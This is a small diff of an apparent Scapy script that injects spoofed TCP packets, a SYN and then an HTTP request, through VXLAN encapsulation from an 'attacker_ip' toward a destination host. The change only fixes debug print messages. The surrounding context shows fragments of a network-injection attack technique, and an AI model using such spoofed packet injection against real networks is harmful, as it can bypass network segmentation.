@@ -140,7 +140,7 @@ def syn_ack_received_send_http_req(src_port, seqnr, acknr):
     http_request = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
     send(http_request, verbose=0)
     if debug:
-        print("### --> PA\tsent to\t\t" + attacker_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < ACK#: " + str(acknr) + " | SEQ#: " + str(seqnr) + " > (HTTP Request)")
+        print("### --> PA\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < ACK#: " + str(acknr) + " | SEQ#: " + str(seqnr) + " > (HTTP Request)")
 
 def fin_function():
     ### Wait until FIN packet is received
@@ -179,6 +179,6 @@ time.sleep(1)
 syn = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn, verbose=0)
 if debug:
-       print("### --> S sent to " + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < SEQ#: 0 >")
+       print("### --> S\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < SEQ#: 0 >")
 
 
